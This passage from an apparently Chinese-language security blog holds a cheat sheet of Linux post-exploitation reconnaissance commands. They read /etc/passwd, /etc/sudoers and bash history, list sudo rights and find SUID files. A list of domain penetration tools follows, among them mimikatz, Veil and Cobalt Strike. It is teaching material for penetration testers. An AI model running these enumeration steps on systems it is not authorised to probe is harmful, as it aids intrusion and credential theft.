+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/issue         #查看系统名称</span><br><span class="line">cat /etc/Lsb-release   #查看系统名称,版本号</span><br><span class="line">cat /etc/*release      #查看linux发行信息</span><br><span class="line">uname -an              #查看内核版本</span><br><span class="line">cat /proc/version      #查看内核信息</span><br><span class="line">cat /proc/cpuinfo      #查看cpu信息</span><br><span class="line"></span><br><span class="line">#查看文件系统</span><br><span class="line">df -a </span><br><span class="line"></span><br><span class="line">#查看系统日志</span><br><span class="line">sudo cat /var/log/syslog</span><br><span class="line"></span><br><span class="line">#查看命令记录</span><br><span class="line">cat /root/.bash_history</span><br><span class="line">cat ~/.bash_history</span><br></pre></td></tr></table></figure>
+
+<p><strong>用户相关</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami     #查看当前shell权限</span><br><span class="line">id         #查看当前用户的权限和所在的管理组</span><br><span class="line"></span><br><span class="line">#查看登录信息</span><br><span class="line">w</span><br><span class="line">who</span><br><span class="line">last       #登入过的用户信息</span><br><span class="line">lastlog    #显示系统中所有用户最近一次登录信息</span><br><span class="line"></span><br><span class="line">#查看账号信息</span><br><span class="line">cat /etc/sudoers</span><br><span class="line">cat /etc/group</span><br><span class="line">cat /etc/passwd</span><br><span class="line"></span><br><span class="line">#列出目前用户可执行与无法执行的指令</span><br><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+
+<p><strong>网络相关</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查询本机IP信息</span><br><span class="line">ifconfig</span><br><span class="line">ip a</span><br><span class="line"></span><br><span class="line">#查看端口信息</span><br><span class="line">netstat -anpt</span><br><span class="line"></span><br><span class="line">#查看网卡配置</span><br><span class="line"> cat /etc/network/interfaces</span><br></pre></td></tr></table></figure>
+
+<p><strong>程序相关</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查看进程信息</span><br><span class="line">ps -ef  #标准格式显示</span><br><span class="line">ps aux  #BSD格式显示</span><br><span class="line"></span><br><span class="line">#资源占有情况</span><br><span class="line">top -c</span><br><span class="line"></span><br><span class="line">cat /etc/inetd.conf        #由inetd管理的服务列表</span><br><span class="line">cat /etc/xinetd.conf       #由xinetd管理的服务列表</span><br><span class="line"></span><br><span class="line">#查看计划任务</span><br><span class="line">crontab -l</span><br><span class="line">ls -al /etc/cron*</span><br><span class="line">cat /etc/cron.allow</span><br><span class="line">cat /etc/cron.deny</span><br><span class="line">cat /etc/crontab</span><br><span class="line"></span><br><span class="line">#查看开机启动项</span><br><span class="line">/etc/rc.d/init.d/</span><br></pre></td></tr></table></figure>
+
+<p><strong>配置信息</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables –L   #查看防火墙配置（注意需要root权限）</span><br><span class="line">cat /etc/resolv.conf   #查看dns配置文件</span><br><span class="line">cat /etc/network/interfaces    #查看网卡配置文件</span><br><span class="line">cat /etc/apache2/apache2.conf   #查看apache配置文件</span><br><span class="line">cat /etc/my.conf               #mysql配置</span><br><span class="line"></span><br><span class="line">#查看suid文件</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">#最近五天的文件</span><br><span class="line">find / -ctime +1 -ctime -5</span><br></pre></td></tr></table></figure>
+
+<h1 id="七、内网域渗透常用工具"><a href="#七、内网域渗透常用工具" class="headerlink" title="七、内网域渗透常用工具"></a>七、内网域渗透常用工具</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、WCE</span><br><span class="line">WCE（Windows 凭据管理器）是安全人员广泛使用的一种安全工具，常用于列出登录会话以及添加、修改、和删除关联凭据（如LM hash、NTLM hash、明文密码和Kerberos票据）。</span><br><span class="line">2、mimikatz</span><br><span class="line">mimikatz主要用于从内存中获取明文密码、现金票据和密钥等。</span><br><span class="line">3、Responder</span><br><span class="line">Responder可以嗅探网络中的所有LLMNR包和获取各主机的信息。</span><br><span class="line">4、BeEF</span><br><span class="line">BeEF利用XSS通过Java Script对目标浏览器进行测试，同时可以配合MSF进行进一步渗透。</span><br><span class="line">5、DSHashes</span><br><span class="line">DSHashes主要从NTDSXtract中提取用户易于理解的散列值。</span><br><span class="line">6、PowerSploit</span><br><span class="line">PowerSploit是基于PowerShell的测试框架，主要用于信息收集、权限提升以及权限维持。</span><br><span class="line">7、Nishang</span><br><span class="line">Nishang也是一款基于PowerShell的测试工具，集成各类payload用于渗透测试。</span><br><span class="line">8、Empire</span><br><span class="line">类似于MSF，也是一款拥有丰富模块和接口的渗透测试工具。</span><br><span class="line">9、ps_encoder.py</span><br><span class="line">ps_encoder.py是使用base64封装的powershell命令包，目的是混淆和压缩代码。</span><br><span class="line">10、smbexec</span><br><span class="line">smbexec是使用Samba工具的快速PsExec类工具，它通过ipc$进行连接，将psexec.exe释放到目标主机中，铜鼓欧服务管理（SCManager）进程创建psexecsvc服务并启动服务并能直接提供目标主机的system权限。</span><br><span class="line">11、the-backdoor-factory-master</span><br><span class="line">the-backdoor-factory-master可以对PE、ELF、Mach-O等二进制文件注入shellcode。</span><br><span class="line">12、Veil</span><br><span class="line">Veil用于生成绕过常见防病毒解决方案的MSF有效载荷。</span><br><span class="line">13、MSF</span><br><span class="line">世界上最常用的渗透测试框架。</span><br><span class="line">14、Cobalt Strike</span><br><span class="line">Cobalt Strike主要用于内网渗透，并提供团队协作功能。</span><br><span class="line">15、Nmap</span><br><span class="line">Nmap主要用于发现主机、扫描端口、识别服务和操作系统等</span><br><span class="line">16、Wireshark</span><br><span class="line">Wireshark主要用于网络协议和数据包分析，可以通过网络接口对整个网络接口进行监听。</span><br><span class="line">17、Putty</span><br><span class="line">Putty在windows下主要作为连接SSH 以及 Telnet 的客户端。</span><br><span class="line">18、sqlmap</span><br><span class="line">sqlmap主要用于检测和利用SQL注入漏洞。</span><br><span class="line">19、Burp Suite</span><br><span class="line">Burp Suite主要用于对web应用程序进行测试，最重要的几个模块为Intruder、Proxy、Repeater，用于抓包分析、参数爆破以及重放攻击。</span><br><span class="line">20、Hydra</span><br><span class="line">Hydra（九头蛇）主要用于登录爆破。</span><br><span class="line">21、Getif</span><br><span class="line">Getif主要用于收集SNMP设备的信息。</span><br><span class="line">22、Cain&amp;Abel</span><br><span class="line">Cain&amp;Abel是windows中的一个密码恢复工具，可以通过嗅探网络，来破解加密密码、记录VoIP会话、恢复无线网络密钥、显示面膜框、发现缓存中的密码、分析路由信息、并能恢复各种密码。</span><br></pre></td></tr></table></figure>
+
+<p>更详细见<a href="https://websec.readthedocs.io/zh/latest/intranet/index.html">https://websec.readthedocs.io/zh/latest/intranet/index.html</a></p>
+<p>域渗透基础知识大全：<a href="https://decemberus.com/2023/08/02/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">https://decemberus.com/2023/08/02/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</a>    重点</p>
 ]]></content>
       <categories>
         <category>Web</category>
